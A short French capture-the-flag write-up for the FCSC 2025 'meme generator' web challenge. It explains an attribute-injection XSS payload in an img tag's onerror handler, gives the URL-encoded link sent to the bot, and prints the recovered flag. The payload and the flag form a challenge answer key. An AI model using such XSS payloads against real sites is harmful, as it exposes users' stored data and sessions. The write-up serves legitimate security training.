https://hackropole.fr/fr/challenges/web/fcsc2025-web-meme-generator/

![[IMG-20251226151127767.png]]

![[IMG-20251226151127839.png]]

![[IMG-20251226151127867.png]]

PAYLOAD:
```php
x" onerror="console.log(localStorage.getItem('flag'))
```

**Explication :**  
Ce payload permet de **fermer l’attribut `src` de la balise `<img>`**, puis d’**injecter un nouvel attribut `onerror`**.  
Lorsque l’image ne peut pas être chargée, l’événement `onerror` est déclenché et exécute le JavaScript injecté.  
Le code s’exécute alors dans le contexte du navigateur du bot (`http://meme-generator/`), ce qui permet d’accéder au `localStorage` et d’exfiltrer le flag via `console.log`.

Ainsi le code construit après l'envoi de la payload est:
```php
<img src="img/x" onerror="console.log(localStorage.getItem('flag'))" class="img-fluid">
```

URL à envoyer au bot:
```
http://meme-generator/?image=x%22%20onerror%3D%22console.log(localStorage.getItem('flag'))%22&text=ok
```

![[IMG-20251226151127913.png]]

```
FCSC{7ceb95bed1244c477d15967098cb71ec98e98678c2f2375de098e5919dba0bd8}
```

